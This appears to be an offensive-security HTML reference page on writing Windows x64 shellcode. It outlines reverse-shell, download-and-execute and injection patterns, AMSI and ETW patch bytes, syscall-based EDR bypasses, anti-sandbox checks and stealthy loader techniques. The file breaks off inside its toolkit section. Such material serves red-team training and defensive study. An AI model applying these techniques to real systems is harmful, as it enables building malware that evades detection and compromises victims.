<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Shellcode Development (Windows x64) Reference</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}body{background:#08090c;color:#e5e7eb;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh}.mono{font-family:'Cascadia Code','IBM Plex Mono','Fira Code',monospace}.off{color:#ef4444;font-weight:600;font-size:.82em}.hd{padding:10px 14px 0;border-bottom:1px solid #1a1d27;background:linear-gradient(180deg,#0c0e14,#08090c)}.hd h1{font-size:1em;font-weight:800;background:linear-gradient(135deg,#60a5fa,#34d399,#fbbf24);-webkit-background-clip:text;-webkit-text-fill-color:transparent}.hd .sub{font-size:.62em;color:#374151}.st{display:flex;gap:1px;overflow-x:auto;flex-wrap:wrap}.sb{padding:4px 7px;border:none;cursor:pointer;border-radius:6px 6px 0 0;font-size:.66em;font-weight:600;white-space:nowrap;background:transparent;color:#374151;border-bottom:2px solid transparent;transition:all .15s}.sb.on{background:#111318}.sb[data-sc="kit"],.sb[data-sc="adv"]{border-left:2px solid #ffffff15;margin-left:4px}.ut{padding:0 14px;background:#0a0b10;border-bottom:1px solid #1a1d27;display:flex}.ub{padding:7px 12px;border:none;cursor:pointer;font-size:.7em;font-weight:600;background:transparent;color:#4b5563;border-bottom:2px solid transparent;display:flex;align-items:center;gap:4px}.ub.on{color:#e5e7eb;border-bottom-color:#e5e7eb}.cnt{font-size:.82em;background:#1f2937;padding:0 4px;border-radius:6px;color:#9ca3af}.ct{padding:10px 14px;overflow-x:auto}.fr{display:flex;align-items:flex-start;gap:0;overflow-x:auto;padding:8px 0}.ar{display:flex;align-items:center;padding:0 4px;flex-shrink:0}.ar .ln{width:24px;height:2px;background:linear-gradient(90deg,#4b5563,#9ca3af)}.ar .tp{color:#9ca3af;font-size:13px;margin-left:-2px}.ar .lb{font-size:.62em;color:#6b7280;margin-left:3px;white-space:nowrap}.bx{background:#0d0f14;border-radius:8px;flex-shrink:0;overflow:hidden}.bx-h{padding:6px 10px;font-weight:700;font-size:.8em}.bx-s{font-size:.65em;color:#4b5563;margin-top:1px}.bx-b{padding:6px 10px}.fd{display:flex;gap:6px;padding:1.5px 0;font-size:.78em;align-items:baseline}.fd.hl{background:#ffffff08;border-radius:3px;padding:2px 4px}.fd .tp{color:#6b7280;font-size:.82em}.tg{display:inline-block;padding:1px 7px;border-radius:4px;font-size:.78em;font-weight:700}.tg-s{padding:0 5px;font-size:.68em}.nt{margin:6px 0;padding:7px 10px;border-radius:6px}.nt .nl{font-size:.6em;font-weight:800;letter-spacing:.08em;margin-bottom:2px}.nt .nb{color:#d1d5db;font-size:.78em;line-height:1.4}.cp{border:1px solid #1f2937;border-radius:8px;overflow:hidden;margin-bottom:6px}.ct2{width:100%;padding:8px 12px;border:none;cursor:pointer;text-align:left;background:#0d0f14;display:flex;align-items:center;gap:8px}.ct2:hover{background:#111827}.cv{color:#6b7280;font-size:12px;transition:transform .15s;display:inline-block}.cv.op{transform:rotate(90deg)}.ct2 .tl{color:#e5e7eb;font-size:.8em;font-weight:600;flex:1}.cb{margin:0;padding:10px 14px;background:#080a0f;font-size:.74em;line-height:1.5;color:#a5f3fc;overflow-x:auto;border-top:1px solid #1f2937;white-space:pre;tab-size:4}.cb .cm{color:#4b5563}.cb .pp{color:#f59e0b}.ti{border-radius:6px;overflow:hidden;border:1px solid #1f2937;background:#0a0c10;margin-bottom:3px}.ti.op{border-color:#f9731640;background:#f9731608}.tt{width:100%;padding:6px 10px;border:none;cursor:pointer;text-align:left;background:transparent;display:flex;align-items:center;gap:6px}.tt .tn{font-size:.78em;font-weight:600;color:#9ca3af}.ti.op .tn{color:#fdba74}.td{padding:4px 10px 8px 26px;color:#d1d5db;font-size:.76em;line-height:1.5}.nb2{padding:2px 6px;border:1px solid #1f2937;border-radius:4px;cursor:pointer;background:#0d0f14;color:#4b5563;font-size:.65em}.ft{padding:8px 14px;border-top:1px solid #1a1d27;display:flex;gap:8px;flex-wrap:wrap;font-size:.6em}.dt{width:6px;height:6px;border-radius:2px;display:inline-block}.grd{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:8px}
</style>
</head>
<body>
<div id="app"></div>
<script>
var $=function(s){return document.querySelector(s)};
var $$=function(s){return Array.prototype.slice.call(document.querySelectorAll(s))};
function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
var SE=[
{id:"pic",l:"A. PIC Fundamentals",i:"\u{1F4BB}",c:"#60a5fa"},
{id:"api",l:"B. API Resolution",i:"\u{1F50D}",c:"#34d399"},
{id:"pat",l:"C. Core Patterns",i:"\u{1F9F1}",c:"#a78bfa"},
{id:"enc",l:"D. Encoding / Crypters",i:"\u{1F510}",c:"#fbbf24"},
{id:"sys",l:"E. Syscall Shellcode",i:"\u{1F4A5}",c:"#f87171"},
{id:"evd",l:"F. Evasion Stubs",i:"\u{1F6E1}\uFE0F",c:"#e879f9"},
{id:"ldr",l:"G. Loader Integration",i:"\u{1F504}",c:"#f59e0b"},
{id:"kit",l:"H. Toolkit",i:"\u{1F9F0}",c:"#f472b6"},
{id:"adv",l:"I. Advanced Tricks",i:"\u{1F525}",c:"#fb923c"}
];
var S={s:'pic',t:'flow'};
function T(t,c,s){return '<span class="tg'+(s?' tg-s':'')+'\" style=\"background:'+c+'18;color:'+c+';border:1px solid '+c+'30\">'+t+'</span>'}
function A(l){return '<div class="ar"><div class="ln"></div><div class="tp">&#9658;</div>'+(l?'<div class="lb">'+l+'</div>':'')+'</div>'}
function B(t,c,b,w,s){return '<div class="bx" style="min-width:'+(w||220)+'px;max-width:'+(w?w+100:330)+'px;border:1px solid '+c+'35"><div class="bx-h" style="color:'+c+';border-bottom:1px solid '+c+'20;background:linear-gradient(135deg,'+c+'12,'+c+'05)">'+t+(s?'<div class="bx-s">'+s+'</div>':'')+'</div><div class="bx-b">'+b+'</div></div>'}
function F(o,n,t,hl){return '<div class="fd'+(hl?' hl':'')+'\">'+(o?'<code class="mono off">'+o+'</code> ':'')+' <span style="flex:1">'+n+'</span>'+(t?'<span class="tp mono">'+t+'</span>':'')+'</div>'}
function N(l,c,b){return '<div class="nt" style="background:'+c+'08;border:1px solid '+c+'25"><div class="nl" style="color:'+c+'">'+l+'</div><div class="nb">'+b+'</div></div>'}
function CRD(icon,title,color,body){return '<div style="border-radius:8px;border:1px solid '+color+'25;background:'+color+'06;overflow:hidden"><div style="padding:8px 10px;color:'+color+';border-bottom:1px solid '+color+'15;font-weight:700;font-size:.76em">'+icon+' '+title+'</div><div style="padding:8px 10px;font-size:.72em;color:#d1d5db;line-height:1.5">'+body+'</div></div>'}
function fPIC(){
var h='<div style="font-size:.72em;font-weight:800;color:#60a5fa;letter-spacing:.06em;margin-bottom:6px">POSITION-INDEPENDENT CODE FUNDAMENTALS</div>';
h+='<div class="fr">';
h+=B("Constraints","#60a5fa",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","No absolute addresses (no .data, no globals)","")+F("","No relocations (must run at any base)","")+F("","No imports (resolve APIs at runtime)","")+F("","No uninitialized data (.bss absent)","")+'</div>',230);
h+=A("achieve");
h+=B("Techniques","#60a5fa",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","RIP-relative addressing (LEA)","")+F("","Stack strings (push/mov)","")+F("","PEB walking for API resolution","")+F("","Delta offset for self-reference","")+'</div>',220);
h+=A("produces");
h+=B("Raw Shellcode","#60a5fa",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Position-independent blob","")+F("","No headers, no sections","")+F("","Runs from any RWX memory","")+F("","Self-contained execution unit","")+'</div>',200);
h+='</div>';
h+='<div class="grd" style="margin-top:8px">';
h+=CRD("\u{1F4BB}","x64 Calling Convention (Microsoft)","#60a5fa",F("RCX","1st integer/pointer argument","",true)+F("RDX","2nd argument","",true)+F("R8","3rd argument","",true)+F("R9","4th argument","",true)+F("Stack","5th+ arguments (RSP+0x28, RSP+0x30, ...)","",true)+F("RAX","Return value","",true)+F("","Shadow space: 32 bytes (0x20) reserved above return addr","",true)+F("","Stack must be 16-byte aligned before CALL",""));
h+=CRD("\u{1F527}","Register Preservation","#60a5fa",F("Volatile","RAX, RCX, RDX, R8-R11 \u2014 caller-saved, clobbered by calls","",true)+F("Non-volatile","RBX, RBP, RDI, RSI, R12-R15, RSP \u2014 callee-saved, must preserve","",true)+F("XMM0-5","Volatile (args + return for float)","",true)+F("XMM6-15","Non-volatile (must save/restore)","",true)+F("","Shellcode entry: save RBX/RBP/R12-R15 if you use them",""));
h+=CRD("\u{1F510}","Null Byte Avoidance","#60a5fa",F("xor eax,eax","Zero register without 0x00 bytes","",true)+F("mov al, 0x60","Use 8-bit register for small values (avoids 32-bit immediate zeros)","",true)+F("lea rax,[rcx+0x60]","Offset instead of absolute address","",true)+F("xor eax,eax; push rax","Null terminator via register","",true)+F("","Check: objdump -d shell.o | grep ' 00 ' to find null bytes",""));
h+=CRD("\u{1F3AF}","Stack Strings Pattern","#60a5fa",F("","Push string in reverse 8-byte chunks onto stack","",true)+F("","Use immediate values that avoid nulls","",true)+F("","Example: \"kernel32.dll\" as two pushes","",true)+F("","Alternative: XOR-encode each chunk, decode in-place","",true)+F("","mov [rsp+N] for precise placement without push",""));
h+=CRD("\u{1F504}","RIP-Relative Addressing","#60a5fa",F("lea rax,[rip+offset]","Address of data relative to current instruction","",true)+F("","x64 natively supports RIP-relative (no delta trick needed)","",true)+F("","x86 legacy: call $+5 / pop ebx for delta offset","",true)+F("","All data references must be RIP-relative or stack-based","",true)+F("","Never use: mov rax, 0x00007FF... (absolute address)",""));
h+=CRD("\u{1F4CA}","Stack Frame for API Calls","#60a5fa",F("","sub rsp, 0x20+N (shadow space + spilled args)","",true)+F("","Align: RSP must be 16-byte aligned at CALL target","",true)+F("","After CALL: add rsp, 0x20+N to clean up","",true)+F("","Tip: sub rsp, 0x28 (shadow 0x20 + alignment 0x8)","",true)+F("","Nested calls: allocate once at shellcode entry, reuse frame",""));
h+='</div>';
h+=N("GOLDEN RULE","#60a5fa","Every byte in your shellcode must be meaningful at any load address. No absolute addresses, no import table, no relocations. If it references data, use RIP-relative LEA or stack construction. If it calls a function, resolve it at runtime via PEB walking.");
return h;
}
function fAPI(){
var h='<div style="font-size:.72em;font-weight:800;color:#34d399;letter-spacing:.06em;margin-bottom:6px">API RESOLUTION VIA PEB WALKING</div>';
h+='<div class="fr">';
h+=B("TEB","#34d399",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("GS:[0x30]","PEB pointer (x64)","")+F("FS:[0x30]","PEB pointer (x86)","")+F("","Thread Environment Block","")+'</div>',180);
h+=A("+0x60");
h+=B("PEB","#34d399",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("+0x018","Ldr (PEB_LDR_DATA*)","")+F("+0x002","BeingDebugged","")+F("","Process Environment Block","")+'</div>',200);
h+=A("+0x20");
h+=B("PEB_LDR_DATA","#34d399",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("+0x010","InLoadOrderModuleList","")+F("+0x020","InMemoryOrderModuleList","")+F("+0x030","InInitializationOrderModuleList","")+'</div>',260);
h+=A("walk");
h+=B("LDR_DATA_TABLE_ENTRY","#34d399",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("+0x030","DllBase (module base addr)","")+F("+0x058","BaseDllName (UNICODE_STRING)","")+F("+0x048","FullDllName","")+'</div>',240);
h+='</div>';
h+='<div class="grd" style="margin-top:8px">';
h+=CRD("\u{1F50D}","InMemoryOrderModuleList Walk","#34d399",F("1.","GS:[0x60] \u2192 PEB","",true)+F("2.","PEB+0x18 \u2192 PEB_LDR_DATA","",true)+F("3.","Ldr+0x20 \u2192 InMemoryOrderModuleList (LIST_ENTRY)","",true)+F("4.","Flink walks forward through loaded modules","",true)+F("5.","Module order: exe \u2192 ntdll.dll \u2192 kernel32.dll","",true)+F("6.","Entry-0x10 gives LDR_DATA_TABLE_ENTRY base (for InMemoryOrder)","",true)+F("7.","DllBase at entry+0x20 (offset from InMemoryOrder link)",""));
h+=CRD("\u{1F527}","Export Table Walk","#34d399",F("1.","DllBase + 0x3C \u2192 e_lfanew (PE header offset)","",true)+F("2.","e_lfanew + 0x88 \u2192 Export Directory RVA (x64)","",true)+F("3.","ExportDir + 0x18 \u2192 NumberOfNames","",true)+F("4.","ExportDir + 0x20 \u2192 AddressOfNames (RVA array)","",true)+F("5.","Hash each name, compare to target hash","",true)+F("6.","Match \u2192 ordinal from AddressOfNameOrdinals[index]","",true)+F("7.","AddressOfFunctions[ordinal] \u2192 function RVA + DllBase",""));
h+=CRD("\u{1F3AF}","API Hash Functions","#34d399",F("ROR13","Classic Metasploit hash. 32-bit. rotate-right 13 each char. Simple but known signature.","",true)+F("DJB2","hash = hash*33 + c. Fast, good distribution. Daniel Bernstein. Common in custom shellcode.","",true)+F("CRC32","Standard CRC32 lookup table. 32-bit. Better collision resistance. Larger stub.","",true)+F("CRC32C","Hardware CRC32 (SSE4.2). Tiny stub but requires CPU support.","",true)+F("Custom","XOR/rotate/add with unique constants. Avoids signature matching on known hash algorithms.",""));
h+=CRD("\u{1F504}","Hash Collision Avoidance","#34d399",F("","Pre-compute all hashes for target DLLs at build time","")+F("","Verify: no two exports share the same hash in your target set","")+F("","Combine: hash(DLL) + hash(function) for uniqueness","")+F("","DLL+function hash: eliminates cross-module collisions","")+F("","Test against full kernel32 + ntdll + user32 export tables",""));
h+='</div>';
h+=N("CRITICAL","#34d399","InMemoryOrderModuleList offsets shift between the LIST_ENTRY link and the actual LDR_DATA_TABLE_ENTRY fields. When walking InMemoryOrder, DllBase is at Flink+0x20 (not +0x30 as in InLoadOrder). Always verify offsets against target OS build.");
return h;
}
function fPAT(){
var h='<div style="font-size:.72em;font-weight:800;color:#a78bfa;letter-spacing:.06em;margin-bottom:6px">CORE SHELLCODE PATTERNS</div>';
h+='<div class="grd">';
h+=CRD("\u{1F310}","Reverse Shell Pattern","#a78bfa",F("1.","Resolve: WSAStartup, WSASocketA, connect, CreateProcessA","",true)+F("2.","WSAStartup(0x0202, &wsadata)","",true)+F("3.","WSASocketA(AF_INET=2, SOCK_STREAM=1, 0, 0, 0, 0)","",true)+F("4.","Build sockaddr_in on stack: AF_INET + port + IP","",true)+F("5.","connect(sock, &addr, 16)","",true)+F("6.","STARTUPINFOA: set hStdInput/Output/Error = socket handle","",true)+F("7.","CreateProcessA(NULL, \"cmd.exe\", ..., &si, &pi)",""));
h+=CRD("\u{1F4E5}","Download & Execute Pattern","#a78bfa",F("1.","Resolve: URLDownloadToFileA (urlmon.dll) or WinHTTP APIs","",true)+F("2.","URLDownloadToFileA(NULL, url, path, 0, NULL)","",true)+F("3.","WinExec(path, SW_HIDE) or CreateProcessA","",true)+F("","Alternative: InternetOpenA \u2192 InternetOpenUrlA \u2192 InternetReadFile","",true)+F("","Read to VirtualAlloc buffer \u2192 execute in-memory (no file drop)",""));
h+=CRD("\u{1F504}","Spawn & Inject Pattern","#a78bfa",F("1.","CreateProcessA(\"notepad.exe\", ..., CREATE_SUSPENDED)","",true)+F("2.","VirtualAllocEx(hProcess, size, MEM_COMMIT, PAGE_RWX)","",true)+F("3.","WriteProcessMemory(hProcess, base, payload, size)","",true)+F("4.","NtCreateThreadEx / QueueUserAPC + ResumeThread","",true)+F("","Payload: next-stage shellcode or reflective DLL",""));
h+=CRD("\u{1F50D}","Egghunter Pattern","#a78bfa",F("","Small stub (~32 bytes) searches memory for marker (\"egg\")","",true)+F("","Egg: unique 8-byte tag prepended to real shellcode","",true)+F("","NtAccessCheckAndAuditAlarm syscall to safely probe pages","",true)+F("","STATUS_ACCESS_VIOLATION \u2192 skip page; otherwise scan bytes","",true)+F("","Use: when injection buffer is tiny but payload is elsewhere in memory",""));
h+=CRD("\u{1F3AF}","Staged Socket Reuse","#a78bfa",F("","Reuse existing socket from initial exploit (no new connection)","",true)+F("","Scan FD table or use getpeername() to find connected socket","",true)+F("","recv() next-stage shellcode into RWX buffer","",true)+F("","jmp to received shellcode","",true)+F("","Advantage: no new network connections, evades firewall rules",""));
h+=CRD("\u{1F527}","Shellcode Stub Template","#a78bfa",F("entry:","Save non-volatile registers (push rbx, rbp, r12-r15)","",true)+F("","sub rsp, frame_size (shadow + alignment)","",true)+F("","Resolve APIs via PEB walk","",true)+F("","Execute payload logic","",true)+F("","Cleanup: add rsp, frame_size; pop saved regs; ret","",true)+F("","If no return needed: call ExitThread / ExitProcess",""));
h+='</div>';return h;
}
function fENC(){
var h='<div style="font-size:.72em;font-weight:800;color:#fbbf24;letter-spacing:.06em;margin-bottom:6px">ENCODING & CRYPTER STUBS</div>';
h+='<div class="fr">';
h+=B("Encoded Payload","#fbbf24",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","XOR / rolling XOR / RC4 / AES encrypted","")+F("","Appears as random data to scanners","")+F("","No recognizable signatures","")+'</div>',220);
h+=A("prepend");
h+=B("Decoder Stub","#fbbf24",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Small ASM routine (20-80 bytes)","")+F("","Decrypts payload in-place or to stack","")+F("","Jumps to decrypted payload","")+'</div>',220);
h+=A("chain");
h+=B("Execution","#fbbf24",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Stub decodes \u2192 payload runs","")+F("","Single contiguous blob","")+F("","Stub + ciphertext shipped together","")+'</div>',200);
h+='</div>';
h+='<div class="grd" style="margin-top:8px">';
h+=CRD("\u{1F510}","XOR Decoder (Single-Byte)","#fbbf24",F("","Simplest encoder: XOR each byte with fixed key","",true)+F("","Decoder: ~15 bytes of ASM","",true)+F("","lea rsi, [rip+payload]; mov ecx, len; .loop: xor byte [rsi], KEY; inc rsi; dec ecx; jnz .loop","",true)+F("","Weakness: single-byte key trivially broken; known plaintext attack","",true)+F("","Use: quick obfuscation, not real encryption",""));
h+=CRD("\u{1F504}","Rolling XOR / Additive","#fbbf24",F("","Each byte XOR'd with previous ciphertext byte","",true)+F("","Key changes per byte: feedback cipher","",true)+F("","prev = buf[i]; buf[i] ^= key; key = prev","",true)+F("","Breaks frequency analysis of single-byte XOR","",true)+F("","Still weak but defeats simple XOR signature detection",""));
h+=CRD("\u{1F512}","RC4 Decoder Stub","#fbbf24",F("","RC4: stream cipher, small state (256-byte S-box)","",true)+F("","KSA (Key Scheduling) in ASM: ~40 instructions","",true)+F("","PRGA (keystream gen): ~20 instructions per byte","",true)+F("","Total stub: ~80-100 bytes + key material","",true)+F("","Advantage: real encryption, key not in ciphertext",""));
h+=CRD("\u{1F3AF}","AES Decoder with Bootstrap","#fbbf24",F("","AES-CBC: stub resolves BCryptOpenAlgorithmProvider etc.","",true)+F("","Alternative: carry AES T-tables in shellcode (adds ~4KB)","",true)+F("","Or: use AES-NI instructions directly (AESENC/AESDEC)","",true)+F("","AES-NI stub: ~60 instructions, requires CPU support check","",true)+F("","Key + IV can be: hardcoded, derived from environment, or fetched",""));
h+=CRD("\u{1F3AD}","Polymorphic Stubs","#fbbf24",F("","Each build generates unique decoder with same logic","",true)+F("","Techniques: register substitution, instruction reordering","",true)+F("","Insert junk instructions (nop sleds, dead code)","",true)+F("","Equivalent instructions: xor/sub/add produce same result","",true)+F("","Metamorphic: re-encode the stub itself each generation",""));
h+=CRD("\u{1F4CA}","Entropy Considerations","#fbbf24",F("","Encrypted shellcode \u2248 7.9-8.0 bits/byte entropy","",true)+F("","Scanners flag high-entropy sections (.text should be ~6.5)","",true)+F("","Mitigation: interleave encoded payload with English text","",true)+F("","Or: use encoding that reduces entropy (base64-like transforms)","",true)+F("","Shannon entropy check: python -c 'import math; ...' on output",""));
h+='</div>';return h;
}
function fSYS(){
var h='<div style="font-size:.72em;font-weight:800;color:#f87171;letter-spacing:.06em;margin-bottom:6px">SYSCALL SHELLCODE (DIRECT & INDIRECT)</div>';
h+='<div class="fr">';
h+=B("Direct Syscall","#f87171",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","mov r10, rcx","")+F("","mov eax, SSN","")+F("","syscall","")+F("","Bypasses ntdll hooks entirely","")+'</div>',200);
h+=A("vs");
h+=B("Indirect Syscall","#f87171",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","mov r10, rcx","")+F("","mov eax, SSN","")+F("","jmp [ntdll_syscall_ret]","")+F("","Return address inside ntdll","")+'</div>',220);
h+=A("why?");
h+=B("Stack Trace","#f87171",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Direct: return addr in RWX memory \u274C","")+F("","Indirect: return addr in ntdll.dll \u2705","")+F("","EDR validates call stack origin","")+'</div>',240);
h+='</div>';
h+='<div class="grd" style="margin-top:8px">';
h+=CRD("\u{1F4A5}","SSN Resolution Techniques","#f87171",F("Hell\'s Gate","Read SSN from ntdll in memory: mov eax,[func+4] if first bytes are 4C 8B D1 B8","",true)+F("Halo\'s Gate","If func is hooked (JMP at start), walk to neighbor syscall stub and compute SSN \u00B1 offset","",true)+F("Tartarus Gate","Handle multiple hook types: near jmp, far jmp, push/ret sequences","",true)+F("SortedSyscalls","Sort Zw* exports by address. Position in sorted order = SSN.","",true)+F("FreshyCalls","Parse ntdll from disk (on-disk copy not hooked) to extract SSNs",""));
h+=CRD("\u{1F527}","Direct Syscall Stub (ASM)","#f87171",F("","NtAllocateVirtualMemory (SSN varies by build):","",true)+F("","mov r10, rcx          ; r10 = first arg (syscall convention)","",true)+F("","mov eax, SSN          ; syscall number","",true)+F("","syscall               ; trap to kernel","",true)+F("","ret                   ; return to caller","",true)+F("","SSN lookup: must resolve at runtime for portability",""));
h+=CRD("\u{1F504}","Indirect Syscall Stub (ASM)","#f87171",F("","Instead of syscall instruction in our code:","",true)+F("","mov r10, rcx","",true)+F("","mov eax, SSN","",true)+F("","jmp qword [syscall_ret_addr]    ; points to syscall;ret in ntdll","",true)+F("","Find gadget: scan ntdll for 0F 05 C3 (syscall; ret)","",true)+F("","Effect: kernel sees return address inside ntdll \u2192 legitimate",""));
h+=CRD("\u{1F3AF}","SSN Table (Common, Win10 22H2)","#f87171",F("NtAllocateVirtualMemory","0x0018","",true)+F("NtProtectVirtualMemory","0x0050","",true)+F("NtWriteVirtualMemory","0x003A","",true)+F("NtCreateThreadEx","0x00C7","",true)+F("NtOpenProcess","0x0026","",true)+F("NtClose","0x000F","",true)+F("","SSNs change every build. Never hardcode in production.",""));
h+=CRD("\u{1F6E1}\uFE0F","Avoiding ntdll Entirely","#f87171",F("","Map fresh ntdll from disk: NtOpenFile \u2192 NtCreateSection \u2192 NtMapViewOfSection","",true)+F("","But: NtOpenFile itself needs a syscall (chicken-and-egg)","",true)+F("","Solution: Hell's Gate reads SSN from hooked ntdll (hook is after mov eax,SSN)","",true)+F("","Or: embed known SSNs for target OS build (less portable)","",true)+F("","SortedSyscalls technique needs zero prior knowledge",""));
h+='</div>';
h+=N("STACK HYGIENE","#f87171","Modern EDR walks the call stack on every syscall. Direct syscalls leave your shellcode address as the return address \u2014 easily flagged as non-backed-by-module. Indirect syscalls solve this by jumping to the syscall;ret gadget inside ntdll, making the stack trace appear legitimate. Always prefer indirect syscalls.");
return h;
}
function fEVD(){
var h='<div style="font-size:.72em;font-weight:800;color:#e879f9;letter-spacing:.06em;margin-bottom:6px">EVASION STUBS IN SHELLCODE</div>';
h+='<div class="grd">';
h+=CRD("\u{1F6E1}\uFE0F","ETW Patch Stub","#e879f9",F("","Patch EtwEventWrite in ntdll to ret (0xC3)","",true)+F("1.","Resolve ntdll base via PEB","",true)+F("2.","Find EtwEventWrite export","",true)+F("3.","VirtualProtect to PAGE_EXECUTE_READWRITE","",true)+F("4.","mov byte [EtwEventWrite], 0xC3","",true)+F("5.","VirtualProtect back to PAGE_EXECUTE_READ","",true)+F("","Effect: all ETW tracing from this process goes silent",""));
h+=CRD("\u{1F510}","AMSI Patch Stub","#e879f9",F("","Patch AmsiScanBuffer in amsi.dll to always return clean","",true)+F("1.","LoadLibraryA(\"amsi.dll\") \u2014 force load if not present","",true)+F("2.","GetProcAddress(hAmsi, \"AmsiScanBuffer\")","",true)+F("3.","Patch first 6 bytes: mov eax, 0x80070057; ret (E_INVALIDARG)","",true)+F("","x64 patch bytes: B8 57 00 07 80 C3","",true)+F("","Alternative: patch AmsiOpenSession (smaller, less monitored)",""));
h+=CRD("\u{1F634}","Sleep Obfuscation Stub","#e879f9",F("","Encrypt shellcode in memory during sleep periods","",true)+F("1.","Register timer callback or create waitable timer","",true)+F("2.","Before sleep: XOR/RC4 encrypt own memory region","",true)+F("3.","Change page protection to PAGE_NOACCESS or NO_ACCESS","",true)+F("4.","Sleep (WaitForSingleObject, etc.)","",true)+F("5.","On wake: restore PAGE_EXECUTE_READ, decrypt","",true)+F("","Evades: memory scanners that scan for shellcode signatures at rest",""));
h+=CRD("\u{1F4DA}","Stack Frame Spoofing","#e879f9",F("","Fake the return address chain to look like legitimate API calls","",true)+F("","Build synthetic stack frames before syscall","",true)+F("","Each frame: saved RBP + return addr pointing into known DLLs","",true)+F("","RBP chain: link frames to create believable call depth","",true)+F("","Used with indirect syscalls for complete stack deception",""));
h+=CRD("\u{1F50D}","Anti-Debug Checks (ASM)","#e879f9",F("PEB.BeingDebugged","mov rax, gs:[0x60]; cmp byte [rax+2], 0 \u2192 debugger attached","",true)+F("NtGlobalFlag","PEB+0xBC: value 0x70 = debugger heap flags set","",true)+F("RDTSC timing","rdtsc before/after block; large delta = single-stepping","",true)+F("INT 2D","Debugger intercepts; normal execution skips next byte","",true)+F("Hardware BPs","DR0-DR3 via NtGetContextThread; non-zero = breakpoints set",""));
h+=CRD("\u{1F3AD}","Anti-Sandbox Checks","#e879f9",F("CPUID","Check processor count (< 2 = VM likely), brand string","",true)+F("Memory","GlobalMemoryStatusEx: < 2GB RAM = sandbox","",true)+F("Disk","GetDiskFreeSpaceEx: < 60GB = likely VM","",true)+F("Username","Check against known sandbox usernames (John, sandbox, malware)","",true)+F("Sleep","Sleep(10000) then check time delta. Sandbox fast-forwards sleep.","",true)+F("Resolution","GetSystemMetrics: screen < 1024x768 = headless sandbox",""));
h+=CRD("\u{1F30D}","Heaven\'s Gate (WoW64 Transition)","#e879f9",F("","32-bit shellcode jumps to 64-bit mode via segment selector 0x33","",true)+F("","push 0x33; push target_64; retf \u2192 switches CS to 64-bit","",true)+F("","Execute 64-bit syscalls from 32-bit process","",true)+F("","Bypasses: WoW64 layer hooks, 32-bit ntdll hooks entirely","",true)+F("","Complex: must handle segment switching, different calling conventions",""));
h+='</div>';return h;
}
function fLDR(){
var h='<div style="font-size:.72em;font-weight:800;color:#f59e0b;letter-spacing:.06em;margin-bottom:6px">LOADER INTEGRATION</div>';
h+='<div class="grd">';
h+=CRD("\u{1F504}","Callback-Based Execution","#f59e0b",F("EnumFonts","EnumFontFamiliesExA(hdc, &lf, (FONTENUMPROC)shellcode, 0, 0)","",true)+F("EnumWindows","EnumWindows((WNDENUMPROC)shellcode, 0)","",true)+F("CertEnumSystemStore","Uses callback pointer \u2192 shellcode","",true)+F("CreateTimerQueueTimer","Timer fires \u2192 shellcode executes","",true)+F("","Advantage: no CreateThread/NtCreateThreadEx call, blends into normal API usage",""));
h+=CRD("\u{1F9F5}","Fiber-Based Execution","#f59e0b",F("1.","ConvertThreadToFiber(NULL) \u2014 convert current thread","",true)+F("2.","CreateFiber(0, (LPFIBER_START_ROUTINE)shellcode, NULL)","",true)+F("3.","SwitchToFiber(shellcodeFiber) \u2014 executes shellcode","",true)+F("","No new thread created","",true)+F("","Fiber scheduling is cooperative (no preemption)",""));
h+=CRD("\u{1F4E6}","APC Injection","#f59e0b",F("","Early Bird: CreateProcess(SUSPENDED) \u2192 QueueUserAPC \u2192 ResumeThread","",true)+F("","APC executes before main thread entry point","",true)+F("","NtQueueApcThread for direct syscall variant","",true)+F("","Special user APC (NtQueueApcThreadEx2): runs immediately","",true)+F("","APC runs in context of target thread when alertable",""));
h+=CRD("\u{1F3AF}","ThreadPool Execution","#f59e0b",F("","TpAllocWork \u2192 TpPostWork \u2192 TpReleaseWork","",true)+F("","Work callback = shellcode address","",true)+F("","Executes in existing thread pool thread","",true)+F("","No CreateThread, no new thread object","",true)+F("","Undocumented ntdll APIs (Tp*)",""));
h+=CRD("\u{1F527}","Entry Convention for Loaders","#f59e0b",F("","Shellcode must handle any entry method gracefully","",true)+F("","Thread entry: RCX = lpParameter","",true)+F("","Callback entry: varies per callback prototype","",true)+F("","APC entry: RCX = NormalContext, RDX = SysArg1, R8 = SysArg2","",true)+F("","Best practice: ignore all args, save all non-volatile, align stack",""));
h+=CRD("\u{1F4CA}","Module Stomping","#f59e0b",F("","Load legitimate DLL (e.g., mshtml.dll) with DONT_RESOLVE_DLL_REFERENCES","",true)+F("","Overwrite .text section with shellcode","",true)+F("","Execution: call into loaded module's address range","",true)+F("","Memory scan sees: code in a known DLL region (backed by file)","",true)+F("","Stomped module must be larger than shellcode",""));
h+='</div>';return h;
}
function fKIT(){
var h='<div style="font-size:.72em;font-weight:800;color:#f472b6;letter-spacing:.06em;margin-bottom:6px">SHELLCODE DEVELOPMENT TOOLKIT</div>';
h+='<div class="grd">';
var tools=[
{n:"NASM",d:"Netwide Assembler. Primary assembler for shellcode. nasm -f win64 shell.asm -o shell.o. Then extract .text with objcopy.",c:"#60a5fa"},
{n:"MASM (ml64)",d:"Microsoft Macro Assembler. Integrated with MSVC. ml64 /c shell.asm. Useful for MSVC toolchain integration.",c:"#a78bfa"},
{n:"FASM",d:"Flat Assembler. Self-hosting. Can produce raw binary directly: format binary. No linker needed for shellcode.",c:"#34d399"},
